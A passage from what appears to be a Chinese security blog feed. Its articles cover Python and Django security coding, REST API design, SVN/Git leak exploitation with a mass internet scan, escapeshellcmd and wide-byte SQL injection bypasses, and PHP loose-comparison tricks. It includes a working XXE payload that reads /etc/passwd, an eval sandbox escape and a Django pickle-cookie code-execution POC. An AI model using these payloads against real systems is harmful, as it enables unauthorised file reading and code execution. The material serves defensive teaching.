xml，excel等上传在我们的产品中经常用到xml来保存一些配置文件，同时也支持xml文件的导出导入，这样在libxml2.9以下就可能导致xxe漏洞。就拿lxml来说吧：123456789101112131415161718root@kali:~/python# cat test.xml&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE xdsec [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;root&gt; &lt;node id="11" name="bb" net="192.168.0.2-192.168.0.37" ltd="" gid="" /&gt;test&amp;xxe;&lt;/root&gt;&gt;&gt;&gt; from lxml import etree&gt;&gt;&gt; tree1 = etree.parse('test.xml')&gt;&gt;&gt; print etree.tostring(tree1.getroot())&lt;root&gt; &lt;node id="11" name="bb" net="192.168.0.2-192.168.0.37" ltd="" gid=""/&gt;testroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/sh 这是因为在lxml中默认采用的XMLParser导致的：12class XMLParser(_FeedParser)| XMLParser(self, encoding=None, attribute_defaults=False, dtd_validation=False, load_dtd=False, no_network=True, ns_clean=False, recover=False, XMLSchema schema=None, remove_blank_text=False, resolve_entities=True, remove_comments=False, remove_pis=False, strip_cdata=True, target=None, compact=True) 关注其中两个关键参数，其中resolve_entities=True,no_network=True,其中resolve_entities=True会导致解析实体，no_network会为True就导致了该利用条件比较有效，会导致一些ssrf问题，不能将数据带出。在python中xml.dom.minidom,xml.etree.ElementTree不受影响 9 不安全的封装9.1 eval 封装不彻底仅仅是将__builtings__置为空，如下方式即可绕过,可参见bug84179 &gt;&gt;&gt; s2=""" ... [x for x in ().__class__.__bases__[0].__subclasses__() ... if x.__name__ == "zipimporter"][0]( ... "/home/xxlegend/eval_test/configobj-4.4.0-py2.5.egg").load_module( ... "configobj").os.system("uname") ... """ &gt;&gt;&gt; eval(s2,{'__builtins__':{}}) Linux 0 9.2 执行命令接口封装不彻底在底层封装函数没有过滤shell元字符，仅仅是限定一些命令，但是其参数未做控制，可参见bug86011 10 总结一切输入都是不可靠的，做好严格过滤。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>安全编码</tag>
        <tag>代码审计</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从Django的SECTET_KEY到代码执行]]></title>
    <url>%2F2015%2F04%2F01%2F%E4%BB%8EDjango%E7%9A%84SECTET_KEY%E5%88%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[1 背景最近审查代码发现某些产品在登录的JS代码中泄露了SECRET_KEY,将该值作为密码加密的盐，这样就暴露了加密salt不太好吧，更重要的是对django的安全造成了极大的威胁。 2 SECRET_KEY作用SECTET_KEY在djanog中使用非常广泛，基本上涉及到安全，加密等的地方都用到了，下面列举一些常见情景：1，json object的签名2，加密函数，如密码重置，表单，评论，csrf的key，session数据 这里面就要重点讲到session的问题，在这里使用不当就会导致代码执行 3 代码执行3.1 settings的session设置django默认存储session到数据库中，但是可能会比较慢，就会使用到缓存，文件，还有cookie等方式，如果采用了cookie机制则有可能代码执行，settings配置如下：SESSION_ENGINE = &#39;django.contrib.sessions.backends.signed_cookies&#39; 3.2 django 1.6以下在django1.6以下，session默认是采用pickle执行序列号操作，在1.6及以上版本默认采用json序列化。代码执行只存在于使用pickle序列话的操作中。 3.3 session处理流程可以简单的分为两部分，process_request和process_response,前者负责选择session引擎，初始化cookie数据。见代码12345class SessionMiddleware(object): def process_request(self, request): engine = import_module(settings.SESSION_ENGINE) session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME, None) request.session = engine.SessionStore(session_key) process_response则是处理返回给用户的cookie信息，比如修改过期时间等。在将session存入缓存后，可能在某个操作中会用到session信息，这个时候就会通过反序列化操作从缓存中取，如果反序列话引擎是采用pickle机制的话就存在代码执行。反序列化的代码位于django.core.signing.py中，这个模块主要是一些签名，加解密操作，同时也包含序列化和反序列化，默认采用JSON引擎，下面是反序列话loads的代码：123456789101112131415def loads(s, key=None, salt='django.core.signing', serializer=JSONSerializer, max_age=None): """ Reverse of dumps(), raises BadSignature if signature fails """ base64d = smart_str( TimestampSigner(key, salt=salt).unsign(s, max_age=max_age)) decompress = False if base64d[0] == '.': # It's compressed; uncompress it first base64d = base64d[1:] decompress = True data = b64_decode(base64d) if decompress: data = zlib.decompress(data) return serializer().loads(data) 3.4 构造POC12345678910111213141516171819202122import osos.environ.setdefault('DJANGO_SETTINGS_MODULE','settings')from django.conf import settingsfrom django.core import signingfrom django.contrib.sessions.backends import signed_cookiesclass Run(object): def __reduce__(self): return (os.system,('touch /tmp/xxlegend.log',))sess = signing.dumps(Run(), serializer=signed_cookies.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')print sessimport urllib2import cookieliburl = 'http://10.24.35.228:8000/favicon.ico'headers = &#123;'Cookie':'sessionid="%s"' %(sess)&#125;request = urllib2.Request(url,headers = headers)response = urllib2.urlopen(request)print response.read() 通过序列化Run类，实现创建一个文件的操作，在反序列化的时候执行这个操作。执行代码完成可看到在/tmp目录创建xxlegend.log文件，同时web报500错误。 总结利用条件总结起来就是这么几句话，首先泄露了SECRET_KEY,其次session引擎采用了signed_cookies,django版本小于1.6即存在代码执行问题。同样的问题也存在于python的其他web框架中，如flask，bottle。 https://github.com/danghvu/pwp/blob/master/exploit.pyhttps://fail0verflow.com/blog/2014/plaidctf2014-web200-reeekeeeeee.htmlhttps://systemoverlord.com/blog/2014/04/14/plaidctf-2014-reekeeeee/http://www.shysecurity.com/post/Reekeehttp://python.usyiyi.cn/django/topics/http/sessions.htmlhttps://github.com/django/django/blob/stable/1.5.x/django/core/signing.pyhttp://stackoverflow.com/questions/15170637/effects-of-changing-djangos-secret-key/15383766?noredirect=1#comment21743494_15383766]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Django</tag>
        <tag>SECRET_KEY</tag>
        <tag>代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[REST API安全设计指南]]></title>
    <url>%2F2015%2F04%2F01%2FREST%20API%20%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[1，REST API 简介REST的全称是REpresentational State Transfer，表示表述性无状态传输，无需session，所以每次请求都得带上身份认证信息。rest是基于http协议的，也是无状态的。只是一种架构方式，所以它的安全特性都需我们自己实现，没有现成的。建议所有的请求都通过https协议发送。RESTful web services 概念的核心就是“资源”。 资源可以用 URI 来表示。客户端使用 HTTP 协议定义的方法来发送请求到这些 URIs，当然可能会导致这些被访问的”资源“状态的改变。HTTP请求对应关系如下：123456789========== ===================== ========================HTTP 方法 行为 示例========== ===================== ========================GET 获取资源的信息 http://xx.com/api/ordersGET 获取某个特定资源的信息 http://xx.com/api/orders/123POST 创建新资源 http://xx.com/api/ordersPUT 更新资源 http://xx.com/api/orders/123DELETE 删除资源 http://xx.com/api/orders/123========== ====================== ======================= 对于请求的数据一般用json或者xml形式来表示，推荐使用json。 2，身份认证身份认证包含很多种，有HTTP Basic，HTTP Digest，API KEY，Oauth，JWK等方式，下面简单讲解下： ##2.1 HTTP BasicREST由于是无状态的传输，所以每一次请求都得带上身份认证信息，身份认证的方式，身份认证的方式有很多种，第一种便是http basic，这种方式在客户端要求简单，在服务端实现也非常简单，只需简单配置apache等web服务器即可实现，所以对于简单的服务来说还是挺方便的。但是这种方式安全性较低，就是简单的将用户名和密码base64编码放到header中。123base64编码前：Basic admin:adminbase64编码后：Basic YWRtaW46YWRtaW4=放到Header中：Authorization: Basic YWRtaW46YWRtaW4= 正是因为是简单的base64编码存储，切记切记在这种方式下一定得注意使用ssl，不然就是裸奔了。在某些产品中也是基于这种类似方式，只是没有使用apache的basic机制，而是自己写了认证框架，原理还是一样的，在一次请求中base64解码Authorization字段，再和认证信息做校验。很显然这种方式有问题，认证信息相当于明文传输，另外也没有防暴力破解功能。 ##2.2 API KEYAPI Key就是经过用户身份认证之后服务端给客户端分配一个API Key，类似：http://example.com/api?key=dfkaj134,一般的处理流程如下：一个简单的设计示例如下：client端： server端： client端向服务端注册，服务端给客户端发送响应的api_key以及security_key，注意保存不要泄露，然后客户端根据api_key,secrity_key,timestrap,rest_uri采用hmacsha256算法得到一个hash值sign，构造途中的url发送给服务端。服务端收到该请求后，首先验证api_key,是否存在，存在则获取该api_key的security_key，接着验证timestrap是否超过时间限制，可依据系统成而定，这样就防止了部分重放攻击，途中的rest_api是从url获取的为/rest/v1/interface/eth0,最后计算sign值，完之后和url中的sign值做校验。这样的设计就防止了数据被篡改。通过这种API Key的设计方式加了时间戳防止了部分重放，加了校验，防止了数据被篡改，同时避免了传输用户名和密码，当然了也会有一定的开销。 2.3 Oauth1.0a或者Oauth2OAuth协议适用于为外部应用授权访问本站资源的情况。其中的加密机制与HTTP Digest身份认证相比，安全性更高。使用和配置都比较复杂，这里就不涉及了。 2.4 JWTJWT 是JSON Web Token，用于发送可通过数字签名和认证的东西，它包含一个紧凑的，URL安全的JSON对象，服务端可通过解析该值来验证是否有操作权限，是否过期等安全性检查。由于其紧凑的特点，可放在url中或者 HTTP Authorization头中，具体的算法就如下图 3 授权身份认证之后就是授权，根据不同的身份，授予不同的访问权限。比如admin用户，普通用户，auditor用户都是不同的身份。简单的示例：12345678910$roles = array('ADMIN'=&gt;array('permit'=&gt;array('/^((\/system\/(clouds|device)$/'), // 允许访问哪些URL的正则表达式'deny'=&gt;array('/^(\/system\/audit)$/') // 禁止访问哪些URL的正则表达式),'AUDIT'=&gt;array('permit'=&gt;array('/^(\/system\/audit)$/'),//允许访问的URL正则表达式'deny'=&gt;array('/^((\/system\/(clouds|device).*)$/'))); 上述是垂直权限的处理，如果遇到了平行权限的问题，如用户A获取用户B的身份信息或者更改其他用户信息，对于这些敏感数据接口都需要加上对用户的判断，这一步一般都在具体的逻辑实现中实现。 4 URL过滤在进入逻辑处理之前，加入对URL的参数过滤，如/site/{num}/policy 限定num位置为整数等，如果不是参数则直接返回非法参数，设定一个url清单，不在不在url清单中的请求直接拒绝，这样能防止开发中的api泄露。rest api接口一般会用到GET,POST,PUT,DELETE,未实现的方法则直接返回方法不允许，对于POST，PUT方法的数据采用json格式，并且在进入逻辑前验证是否json，不合法返回json格式错误。 5 重要功能加密传输第一步推荐SSL加密传输，同时对于系统中重要的功能做加密传输，如证书，一些数据，配置的备份功能，同时还得确保具备相应的权限，这一步会在授权中涉及。 6 速率限制请求速率限制，根据api_key或者用户来判断某段时间的请求次数，将该数据更新到内存数据库（redis，memcached），达到最大数即不接受该用户的请求，同时这样还可以利用到内存数据库key在特定时间自动过期的特性。在php中可以使用APC，Alternative PHP Cache (APC) 是一个开放自由的PHP opcode 缓存。它的目标是提供一个自由、 开放，和健全的框架用于缓存和优化PHP的中间代码。在返回时设置X-Rate-Limit-Reset:当前时间段剩余秒数，APC的示例代码如下：12345678910111213Route::filter('api.limit', function()&#123;$key = sprintf('api:%s', Auth::user()-&gt;api_key);// Create the key if it doesn't existCache::add($key, 0, 60);// Increment by 1$count = Cache::increment($key);// Fail if hourly requests exceededif ($count &gt; Config::get('api.requests_per_hour'))&#123;App::abort(403, 'Hourly request limit exceeded');&#125;&#125;); 7 错误处理对于非法的，导致系统出错的等请求都进行记录，一些重要的操作，如登录，注册等都通过日志接口输出展示。有一个统一的出错接口，对于400系列和500系列的错误都有相应的错误码和相关消息提示，如401：未授权；403：已经鉴权，但是没有相应权限。如不识别的url:{&quot;result&quot;:&quot;Invalid URL!&quot;},错误的请求参数{&quot;result&quot;:&quot;json format error&quot;},不允许的方法：{&quot;result&quot;:&quot;Method Not Allowed&quot;}，非法参数等。上面所说的都是单状态码，同时还有多状态码，表示部分成功，部分字符非法等。示例如下：12345678910111213141516171819202122HTTP/1.1 207 Multi-StatusContent-Type: application/json; charset=&quot;UTF-8&quot;Content-Length: XXXX&#123;&quot;OPT_STATUS&quot;: 207&quot;DATA&quot;: &#123; &quot;IP_ADDRESS&quot;: [&#123; &quot;INTERFACE&quot;: &quot;eth0&quot;, &quot;IP_LIST&quot;:[&#123; &quot;IP&quot;: &quot;192.168.1.1&quot;, &quot;MASK&quot;: &quot;255.255.0.0&quot;,&quot;MULTI_STATUS&quot;: 200, &quot;MULTI_RESULT&quot;: &quot;created successfully&quot; &#125;,&#123; &quot;IP&quot;: &quot;192.167.1.1&quot;, &quot;MASK&quot;: &quot;255.255.0.0&quot;,&quot;MULTI_STATUS&quot;: 409, &quot;MULTI_RESULT&quot;: &quot;invalid parameter&quot;&#125;]&#125;]&#125;, 8 重要ID不透明处理在系统一些敏感功能上，比如/user/1123 可获取id=1123用户的信息，为了防止字典遍历攻击，可对id进行url62或者uuid处理，这样处理的id是唯一的，并且还是字符安全的。 9 其他注意事项（1）请求数据，对于POST,DELETE方法中的数据都采用json格式，当然不是说rest架构不支持xml，由于xml太不好解析，对于大部分的应用json已经足够，近一些的趋势也是json越来越流行，并且json格式也不会有xml的一些安全问题，如xxe。使用json格式目前能防止扫描器自动扫描。（2）返回数据统一编码格式，统一返回类型，如Content-Type: application/json; charset=”UTF-8”（3）在逻辑实现中，json解码之后进行参数验证或者转义操作，第一步json格式验证，第二步具体参数验证基本上能防止大部分的注入问题了。（4）在传输过程中，采用SSL保证传输安全。（5）存储安全，重要信息加密存储，如认证信息hash保存。 总之，尽量使用SSL。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>REST API</tag>
        <tag>安全设计指南</tag>
        <tag>API KEY</tag>
        <tag>授权认证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Django安全机制]]></title>
    <url>%2F2015%2F04%2F01%2FDjango%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[#1 xssdjango 已经能防范95%的xss问题，主要原理就是将&lt;,&gt;,&amp;做了转化，但是如下情况还是无能为力（1）属性有动态内容，正确：&lt;img alt=&quot;{{good}}&quot;&gt;,错误：&lt;img alt={{bad}}&gt;,请确保加上双引号。（2）插入到CSS中的数据(style 标签和属性),以及javascript(script标签,事件处理器,onclick等其他属性),在这些标签内请手动escape.（3）还有就是使用了mark_safe跳过了template默认机制或者autoescape关闭了。（4）涉及到dom类型的xss，如document.write等（5）HttpResponse返回动态内容另外注意属性中包含url(href,img src)时验证url协议在白名单内(如http,https,mailto,ftp) #2 csrf1，确保django.middleware.csrf.CsrfViewMiddleware已经开启 在settings.py中，默认是存在的。2，在所有的post表单中中添加了csrf_token，如{% csrf_token %}3，在相应的view函数中，使用了django.template.context_processors.csrf，用法有两种，一个是RequestContext,另外就是手工引入,如下是手工引入:12345678from django.shortcuts import render_to_responsefrom django.template.context_processors import csrfdef my_view(request): c = &#123;&#125; c.update(csrf(request)) # ... view code here return render_to_response("a_template.html", c) @csrf_exempt装饰器是去除csrf防护,另外内置的CSRF保护机制对子域也是无能为力,比如应用在example.com,有一个子域alice.example.com放置用户可控制的内容,这个时候csrf机制是不起作用的.最后注意不要使用get请求去做增删改操作,否则内置的CSRF机制也是无效的. #3 sql注入直接拼接的sql会有注入风险，那如何避免呢？使用django的数据库api，会根据对应的数据库加过滤，但是有两个例外：（1）extra方法中的where参数处,这个参数是故意设计成接受原始SQL；extra的正确用法：Entry.objects.extra(where=[&#39;headline=%s&#39;], params=[&#39;Lennon&#39;])错误用法：Entry.objects.extra(where=[&quot;headline=&#39;Lennon&#39;&quot;])（2）直接使用低层次的数据库api，如execute，raw，可以采用cursor.execute(sql, [user])方式避免，但是部分时候是失效的，如表的位置，列的位置，这种情况下可以使用django.db.connection.ops.quote_name来自己手工加过滤在有params的情况下，django会正确的转义，没有params的情况则不行。正确做法:12345678from django.db import connection def user_contacts(request): user = request.GET['username'] sql = "SELECT * FROM user_contacts WHERE username = %s" cursor = connection.cursor() cursor.execute(sql, [user]) # ... do something with the results #4 点击劫持django已经有X-Frame-Options middleware来处理，强烈建议添加 #5 host头验证使用django.http.HttpRequest.get_host() 可以获取到host，有伪造的话直接报错了，如果直接访问request.META则没有这效果 #6 文件上传django的imageField只会判断上传的文件是否有一个合法的png头，所以基本上无法限制有害文件的上传。（1）另建一个文件服务器（2）限制文件大小，防止dos攻击，如设置apache的LimitRequestBody大小（3）确保文件不可执行（4）传到二级域名上，比如说传到usercontent-example.com上而不是usercontent.example.com上（5）限制文件上传的类型 #7 email头注入用于发送垃圾邮件，hacker发送如下：hello\ncc:spamvictim@example.com 就转变成了To: hardcoded@example.com Subject: hello cc: spamvictim@example.com 可使用djaong.core.mail来发送，他是不允许任意字段中包含newlines #8 目录遍历目录遍历也算一种注入,主要是突破目录限制读取或者写入文件,django中内置的静态内容视图就是一个做转义很好的例子(django.views.static),相关代码如下:1234567891011121314151617import osimport posixpath path = posixpath.normpath(urllib.unquote(path))newpath = ''for part in path.split('/'): if not part: # strip empty path components continue drive, part = os.path.splitdrive(part) head, part = os.path.split(part) if part in (os.curdir, os.pardir): # strip '.' and '..' in path continue newpath = os.path.join(newpath, part).replace('\\', '/')]]></content>
      <categories>
        <category>Django</category>
      </categories>
      <tags>
        <tag>Django</tag>
        <tag>安全属性</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SVN和GIT信息泄漏利用原理及现状]]></title>
    <url>%2F2015%2F04%2F01%2FSVN%E5%92%8CGIT%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%E5%8F%8A%E7%8E%B0%E7%8A%B6%2F</url>
    <content type="text"><![CDATA[1，google hacksvn 搜索技巧图1git 搜索技巧图2 2，svn信息利用原理2.1 svn&lt;=1.6从svn的结构图可以看到一个目录text-base,这里有我们源文件的备份,比如要下载somedomain/phpinfo.php,直接访问目录somedomain/.svn/text-base/phpinfo.php.text-base,一般的服务器既不会阻止该目录也不会解释该后缀，我们就可以直接读到本地来。现在只是访问最顶层的文件信息，那怎么遍历呢？这里面就有.svn/entries，这个文件包含着该基础目录下所有的文件和目录，直接递推查找就行。 2.2 svn&gt;1.6svn在1.6之后引入了wc.db来管理文件，该文件位于.svn/wc.db。普通文件位置：somedomain/.svn/pristine/“XX”/“CHECKSUM”.svn-base,CHECKSUM是文件的sha1值，xx则是他的前两位。那这个CHECKSUM去哪找呢？就是我们刚才提到的wc.db，这是一个sqlite数据库。数据库的大体结构如下：123456789101112$ sqlite3 wc.db .tablesACTUAL_NODE NODES PRISTINE WC_LOCKEXTERNALS NODES_BASE REPOSITORY WORK_QUEUELOCK NODES_CURRENT WCROOT$ sqlite3 wc.db 'select local_relpath, checksum from NODES'index.php|$sha1$4e6a225331f9ae872db25a8f85ae7be05cea6d51scripts/menu.js|$sha1$fabeb3ba6a96cf0cbcad1308abdbe0c2427eeebfstyle/style.js|$sha1$2cc5590e0ba024c3db77a13896da09b39ea74799$ sqlite3 wc.db 'select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || substr(checksum,7) || ".svn-base" as alpha from NODES;'index.php|.svn/pristine/4e/4e6a225331f9ae872db25a8f85ae7be05cea6d51.svn-basescripts/menu.js|.svn/pristine/fa/fabeb3ba6a96cf0cbcad1308abdbe0c2427eeebf.svn-basestyle/style.js|.svn/pristine/2s/2cc5590e0ba024c3db77a13896da09b39ea74799.svn-base 第一步下载wc.db,然后从NODES表中找到文件名和其sha1值，最后构造下载链接。 3，git 信息利用原理首先从git/config信息里面可以得到仓库地址1234567891011[core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true[remote &quot;origin&quot;] fetch = +refs/heads/*:refs/remotes/origin/* url = git@git.jingdigital.net:root/pcb001.git[branch &quot;master&quot;] remote = origin merge = refs/heads/master 基本上三步走：（1）下载.git/index文件，这是一种git特有的格式，在该文件中包含着文件名和文件SHA1值。（2）根据该文件SHA1值到objects目录下载相应文件，具体路径somedomain/.git/objects/“XX”/“CHECKSUM”（3）zlib解压文件，按照原始目录写入源代码。 4，对国内80端口的简单扫描有了前面这些基础，就可以通过泄漏的信息来还原代码，能还原代码的话就可以干很多事了。最常见就是代码中泄漏email地址，数据库连接方式，调试接口，一些第三方key的泄漏。另外还可以对你感兴趣的目标进行代码审计，发现注入，命令执行等等。 4.1 扫描实现（1）从文件读取80ip段数据，设最大并发16，最大连接数60，这个时候的带宽基本控制在600KB，利用周末时间跑了一天即可跑完。（2）设置pycurl的一些参数，如PROXY,MAXREDIRS=0，这样就不跳转了，nosignal=1 这个参数必须为1，这是pycurl的一个bug，中间测试的过程中就是因为参数未加，导致跑了半天结果中途挂了。（3）请求/.git/config信息，如果200，返回的类型为text/plain并且存在repositoryformatversion字段。请求/.svn/entries,如果200，Content-Type为text/plain,并且dir存在于返回值。其实这个是有误的，因为在svn大于1.6的情况下，在返回值中只有一个简单的数字，并不存在dir，所以扫描结果中基本上没有1.6以上的结果。 4.2 结果过滤在扫描的结果中分析出现的url，有些.svn/entries返回200，但是首页确是有问题，还有发现某些ip不在中国。于是写了脚本去请求这些url的首页，并且从一个ip查询网站去查询ip地址归属。 4.3 初步结果在525万80端口数据中，跑出6000条结果，相当于千分之一的概率，另外还未包括前面对svn 1.6判断有误的分析，所以这个概率还是很高的。简单的分析了git信息的泄漏，总共有接近600条数据，去除在国外的和首页不正常的，能达到250多，其中差不多一半的都是在阿里云的ip上，这些公司一般都是创业公司。在这些泄漏的代码中sql注入一般很少。svn的话，一般都是一些比较老的网站，这主要可能还是我前面的判断逻辑有点小问题。注入问题比较严重。]]></content>
      <categories>
        <category>信息泄露</category>
      </categories>
      <tags>
        <tag>SVN</tag>
        <tag>GIT</tag>
        <tag>信息泄露</tag>
        <tag>利用原理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从escapeshellcmd bypass说起到宽字节注入]]></title>
    <url>%2F2015%2F03%2F01%2F%E4%BB%8Eescapeshellcmd%20bypass%E8%AF%B4%E8%B5%B7%E5%88%B0%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[1 php 多字节绕过escapeshellcmdescapeshellcmd()对shell元字符过滤加反斜杠；反斜线（\）会在以下字符之前插入： #&amp;;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF，但在php5.2.5及之前存在通过输入多字节绕过escapeshellcmd的问题。5.2.6 已经修复了该问题。 执行 escapeshellcmd(“echo “.chr(0xc0).”;id”);加上反斜杠之后，也就是echo \xc0\x5c;id,在中文环境中\xc0\x5c是会被认为是gbk字符的。1234567&gt;&gt;&gt; hex(ord('\\'))'0x5c'&gt;&gt;&gt; s='\xc0\x5c'&gt;&gt;&gt; print s.decode('gbk').encode('utf8')繺&gt;&gt;&gt; s.decode('gbk').encode('utf8')'\xe7\xb9\xba' \被吃掉之后于是就变成了echo 繺;id 了。gbk是宽字节，两个字节，gbk字符范围：8140-FEFE，首字节在81-FE直接，尾字节在40-FE之间，显然5C在尾字节中。考虑0xbf;id,escape之后就变成了0xbf5c;id，0xbf5c是一个合法的GBK编码，那就变成了[0xbf5c];id了。而utf8表示中文一般三个字节。同样受影响的还有escapeshellarg()，源码中的处理是一个字节一个字节来处理的。这种漏洞应该有一定普遍性，在当时来说。下面我们看下修复的源代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374char *php_escape_shell_cmd(char *str) &#123; register int x, y, l; char *cmd; char *p = NULL; TSRMLS_FETCH(); l = strlen(str); cmd = safe_emalloc(2, l, 1); //申请了2倍字符 for (x = 0, y = 0; x &lt; l; x++) &#123; int mb_len = php_mblen(str + x, (l - x)); //这一段是5.2.6新加的，就是在处理多字节符号的时候，当多字节字符小于0的时候不处理，大于1的时候跳过，等于1的时候执行过滤动作 /* skip non-valid multibyte characters */ if (mb_len &lt; 0) &#123; continue; &#125; else if (mb_len &gt; 1) &#123; memcpy(cmd + y, str + x, mb_len); y += mb_len; x += mb_len - 1; continue; &#125; switch (str[x]) &#123; case '"': case '\'':#ifndef PHP_WIN32 if (!p &amp;&amp; (p = memchr(str + x + 1, str[x], l - x - 1))) &#123; /* noop */ &#125; else if (p &amp;&amp; *p == str[x]) &#123; p = NULL; &#125; else &#123; cmd[y++] = '\\'; &#125; cmd[y++] = str[x]; break;#endif case '#': /* This is character-set independent */ case '&amp;': case ';': case '`': case '|': case '*': case '?': case '~': case '&lt;': case '&gt;': case '^': case '(': case ')': case '[': case ']': case '&#123;': case '&#125;': case '$': case '\\': case '\x0A': /* excluding these two */ case '\xFF':#ifdef PHP_WIN32 /* since Windows does not allow us to escape these chars, just remove them */ case '%': cmd[y++] = ' '; break;#endif cmd[y++] = '\\'; /* fall-through */ default: cmd[y++] = str[x]; &#125; &#125; cmd[y] = '\0'; return cmd;&#125; 这个bypass已经成为过去时了，但是还是有很大的借鉴意义，就是宽字节注入，这种情况不仅仅发生命令注入时，更多的时候在sql注入，下面来分析一下宽字节注入如下三种情况，都是由于宽字节的问题导致的。 2 宽字节sql注入1，一种情况 iconv转换，addslashes之后从gbk转到utf8123456789101112$user = $_POST[ 'username' ];$user = addslashes($user);$user = iconv("gbk", 'utf8', $user);$pass = $_POST[ 'password' ];$pass = md5( $pass );$qry = "SELECT * FROM `users` WHERE user='$user' AND password='$pass';";print_r($qry);$result = @mysql_query($qry) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );var_dump($result); 处理过程如下：%bf%27—-（addslashes）-&gt;%bf%5c%27—–（utf8）—-&gt;縗’ 这样单引号就放出来了，大体流程是%bf%27经过addslashes之后变成了%bf%5c%27，再经过iconv从gbk转换为utf8的时候，变成了%e7%b8%97%27，也就是縗’。利用的前提是设置了set names utf8。 2，在php中使用mysql_query(‘set names gbk’),指定了客户端，连接层，结果为gbk编码。构造数据%bf%27，过程和第一种情况类似%bf%27—(addslashes)–&gt;%bf%5c%27—(set names gbk)—&gt;縗’ 3，iconv转换从utf8到gbk，set names字符集为gbk，构造数据如下%e9%8c%a6带入反斜杠\,注释掉单引号大体数据流程：%e9%8c%a6—–(utf8)—-%e5%5c—-(addslashes)—&gt;%e5%5c%5c12345&gt;&gt;&gt; s = '\xe9\x8c\xa6'&gt;&gt;&gt; s.decode('utf8')u'\u9326'&gt;&gt;&gt; s.decode('utf8').encode('gbk')'\xe5\\' 总之一条，都是打的%5c的注意，要么转义后转utf8吃掉%5c,要么转utf8后再转义放出%5c 参考：http://seclists.org/bugtraq/2008/May/61http://www.sektioneins.de/en/advisories/advisory-032008-php-multibyte-shell-command-escaping-bypass-vulnerability.htmlhttp://php.net/ChangeLog-5.phphttp://php.net/releases/]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>从escapeshellcmd</tag>
        <tag>宽字节注入</tag>
        <tag>mysql</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Php比较操作符带来的安全问题]]></title>
    <url>%2F2015%2F01%2F01%2FPHP%E6%AF%94%E8%BE%83%E6%93%8D%E4%BD%9C%E7%AC%A6%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[1 比较操作符php的比较操作符有==（等于）松散比较，===（完全等于）严格比较，这里面就会引入很多有意思的问题。在松散比较的时候，php会将他们的类型统一，比如说字符到数字，非bool类型转换成bool类型，为了避免意想不到的运行效果，应该使用严格比较。如下是php manual上的比较运算符表： 12345678910例子 名称 结果$a == $b 等于 TRUE，如果类型转换后 $a 等于 $b。$a === $b 全等 TRUE，如果 $a 等于 $b，并且它们的类型也相同。$a != $b 不等 TRUE，如果类型转换后 $a 不等于 $b。$a &lt;&gt; $b 不等 TRUE，如果类型转换后 $a 不等于 $b。$a !== $b 不全等 TRUE，如果 $a 不等于 $b，或者它们的类型不同。$a &lt; $b 小与 TRUE，如果 $a 严格小于 $b。$a &gt; $b 大于 TRUE，如果 $a 严格大于 $b。$a &lt;= $b 小于等于 TRUE，如果 $a 小于或者等于 $b。$a &gt;= $b 大于等于 TRUE，如果 $a 大于或者等于 $b。 2 安全问题2.1 hash比较缺陷php在处理hash字符串的时候会用到!=,==来进行hash比较，如果hash值以0e开头，后边都是数字，再与数字比较，就会被解释成0*10^n还是为0，就会被判断相等，绕过登录环节。1234root@kali:~/tool# php -r &apos;var_dump(&quot;00e0345&quot; == &quot;0&quot;);var_dump(&quot;0e123456789&quot;==&quot;0&quot;);var_dump(&quot;0e1234abc&quot;==&quot;0&quot;);&apos;bool(true)bool(true)bool(false) 当全是数字的时候，宽松的比较会执行尽力模式，如0e12345678会被解释成0*10^12345678,除了e不全是数字的时候就不会相等，这能从var_dump(&quot;0e1234abc&quot;==&quot;0&quot;)可以看出来。 2.2 bool 欺骗当存在json_decode和unserialize的时候，部分结构会被解释成bool类型，也会造成欺骗。json_decode示例代码：123456$json_str = '&#123;"user":true,"pass":true&#125;';$data = json_decode($json_str,true);if ($data['user'] == 'admin' &amp;&amp; $data['pass']=='secirity')&#123; print_r('logined in as bool'."\n");&#125; 运行结果：12root@kali:/var/www# php /root/php/hash.phplogined in as bool unserialize示例代码：123456$unserialize_str = 'a:2:&#123;s:4:"user";b:1;s:4:"pass";b:1;&#125;';$data_unserialize = unserialize($unserialize_str);if ($data_unserialize['user'] == 'admin' &amp;&amp; $data_unserialize['pass']=='secirity')&#123; print_r('logined in unserialize'."\n");&#125; 运行结果如下：12root@kali:/var/www# php /root/php/hash.phplogined in unserialize 2.3 数字转换欺骗123456789$user_id = ($_POST['user_id']); if 